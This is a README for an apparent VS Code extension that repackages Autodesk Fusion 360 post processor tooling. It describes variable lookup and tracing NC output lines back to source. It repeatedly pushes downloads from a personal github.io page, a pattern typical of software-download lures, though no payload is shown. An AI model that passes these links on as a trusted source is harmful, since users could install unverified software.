# Autodesk Fusion 360 Post Editor v1.0 - VS Code extension 2026

> **A Visual Studio Code extension for Autodesk Fusion 360 post workflows that helps you inspect post logic, work with NC output, and move between output and source with less friction.**

[![Platform](https://img.shields.io/badge/Platform-Visual%20Studio%20Code-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/taylorjan96/fusion-360-post-editor-hub?style=flat-square)](https://github.com/taylorjan96/fusion-360-post-editor-hub)

---

<p align="center">
  <a href="https://taylorjan96.github.io/fusion-360-post-editor-hub/">
    <img src="https://img.shields.io/badge/Download-Autodesk%20Fusion%20360%20Post%20Editor%20Latest-brightgreen?style=for-the-badge" alt="Download Autodesk Fusion 360 Post Editor">
  </a>
</p>

> **[Direct Download - Autodesk Fusion 360 Post Editor v1.0](https://taylorjan96.github.io/fusion-360-post-editor-hub/)**

---

[Download Latest Build](https://taylorjan96.github.io/fusion-360-post-editor-hub/)

---

## What Is Autodesk Fusion 360 Post Editor?

This project packages Autodesk post processor tooling as a Visual Studio Code extension. Rather than juggling separate utilities, you get a single place to read, modify, and trace post-related files without leaving the editor you already use.

The extension targets people who spend time in Fusion 360, Inventor CAM, and HSMWorks post processor output. Its core aim is practical: let you look up post variables and functions quickly, and make it easy to trace a line of NC output back to the code responsible for it.

---

## Capabilities

- Run post operations from within Visual Studio Code
- Browse post processor variables and functions through a quick view
- Trace any NC output line back to its matching source location
- Built for Autodesk Fusion 360 post processor workflows
- Also suited to Inventor CAM and HSMWorks post tasks
- A lightweight, editor-native utility for developing and reviewing posts
- Cuts down on back-and-forth between output files and source files

---

## Getting Started

1. Grab the newest build from the project page.
2. Open or install the extension in Visual Studio Code.
3. Restart VS Code when prompted.

To work from source instead, clone the repository and open it in VS Code:

1. `git clone https://github.com/taylorjan96/fusion-360-post-editor-hub.git
2. Open the project folder in Visual Studio Code
3. Launch or package the extension using your normal VS Code extension workflow

---

## How to Use It

Once installed, load your Autodesk post processor files or the related NC output into Visual Studio Code. You can then examine post logic, check which variables and functions are available, and use output-line navigation to return to the source behind any given result.

A common session looks like this:
1. Open the post file in VS Code
2. Use the extension to inspect post variables and functions
3. Generate or review NC output
4. Click an NC output line to jump to the related code location
5. Continue editing and testing in the same workspace

---

## Configuration

Extension options live in Visual Studio Code's extension preferences and workspace files.

If your project relies on specific paths or post-processing options, keep them in the VS Code workspace or user settings area so they carry over between sessions. For shared environments, place local adjustments in the workspace configuration to keep things consistent.

Example layout:

{
  "autodeskFusion360PostEditor.enabled": true,
  "autodeskFusion360PostEditor.workspaceMode": "default"
}

---

## Requirements

- Visual Studio Code
- A compatible Autodesk post-processing workflow
- Access to Fusion 360, Inventor CAM, or HSMWorks post files when working with those sources
- Enough local storage for the extension, project files, and generated NC output

---

## FAQ

**Does it work inside Visual Studio Code?**  
Yes. The extension is centered on the VS Code environment.

**What kind of files is it meant for?**  
It is intended for Autodesk post processor work and related NC output review.

**Can I inspect post variables and functions?**  
Yes. A quick view is included for browsing post processor variables and functions.

**How do I move from output to source?**  
You can click NC output lines to jump to the associated code location.

**Where are updates published?**  
Use the download link above to check the latest build.

**What if I need to change settings?**  
Review your VS Code user or workspace settings, since extension options are managed there.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
